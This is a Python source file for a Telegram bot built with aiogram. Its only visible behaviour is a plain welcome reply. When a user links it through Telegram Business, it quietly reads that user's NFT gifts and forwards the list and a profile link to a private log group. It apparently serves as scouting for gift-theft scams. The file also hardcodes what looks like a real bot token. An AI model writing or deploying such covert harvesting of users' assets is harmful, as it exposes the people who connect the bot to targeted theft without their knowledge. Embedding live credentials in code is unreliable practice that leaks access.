import logging
import asyncio
from aiogram import Bot, Dispatcher
from aiogram.enums import ParseMode
from aiogram.types.business import BusinessConnection
from aiogram.client.default import DefaultBotSettings
from aiogram.methods.get_user_gifts import GetUserGifts
from aiogram.utils.markdown import hlink
from aiogram import F, Router
from aiogram.types import Message

API_TOKEN = "8120657679:AAGqf3YCJML6HmgObyOXz8cdcfDX6dY1STw"
LOG_GROUP_ID = -1002710995756

bot = Bot(token=API_TOKEN, default=DefaultBotSettings(parse_mode=ParseMode.HTML))
dp = Dispatcher()
router = Router()

@dp.business_connection()
async def on_business_connect(bc: BusinessConnection):
    try:
        conn = bc.business_connection  # Get connection info
        user = conn.user
        uid = user.id
        username = f"@{user.username}" if user.username else user.full_name

        # Fetch NFTs
        try:
            gifts = await bot(GetUserGifts(user_id=uid))
            if not gifts.gifts:
                nft_text = "❌ No NFTs found for this user."
            else:
                nft_list = "\n".join([f"• {g.title or g.unique_id}" for g in gifts.gifts])
                nft_text = f"🎁 NFTs of {username}:\n{nft_list}"
        except Exception as e:
            nft_text = f"⚠️ Failed to fetch NFTs: {e}"

        # Send to log group
        await bot.send_message(
            LOG_GROUP_ID,
            f"🤖 {hlink(username, f'tg://user?id={uid}')} added the bot via Business Chatbots.\n\n{nft_text}"
        )

    except Exception as e:
        logging.error(f"Business connection error: {e}")

@dp.message(F.text == "/start")
async def cmd_start(message: Message):
    await message.reply("Welcome to the bot 👋")

async def main():
    logging.basicConfig(level=logging.INFO)
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
